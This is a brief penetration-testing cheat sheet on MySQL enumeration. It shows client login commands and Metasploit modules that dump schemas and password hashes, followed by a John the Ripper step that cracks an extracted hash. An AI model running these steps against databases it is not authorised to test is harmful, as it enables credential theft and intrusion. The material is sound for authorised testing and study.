# MySQL

[MySQL](https://www.mysql.com/) is an open-source relational database management system.

## Enumerating

To enumerate MySQL you can use default-mysql-client and metasploit.

When the following conditions are met,

    - We have a password

    - We have a username
use
## MySQL client
```bash
mysql -h [IP] -u [USERNAME] -p
```
## Metasploit
```bash
# start metasploit

msfconsole

# search module

search mysql_sql

# set module, options, and run

use auxiliary/admin/mysql/mysql_sql

show options

exploit

# set SQL show databases
```
When the following conditions are met,

    - we have MySQL server credentials

	- we know the version of MySQL running

	- we know the number of Databases and their names

use Metasploit to extract password hashes.
<br></br>
```bash
# start metasploit

msfconsole

# search, set and run modules

search mysql_schemadump

use auxiliary/scanner/mysql/mysql_schemadump

search mysql_hashdump

use auxiliary/scanner/mysql/mysql_hashdump

# copy extracted hash to file

echo -n 'example:*EA031893AA21444B170FC2162A56978B8CEECE18' > hash.txt

# crack it with john

john hash.txt
```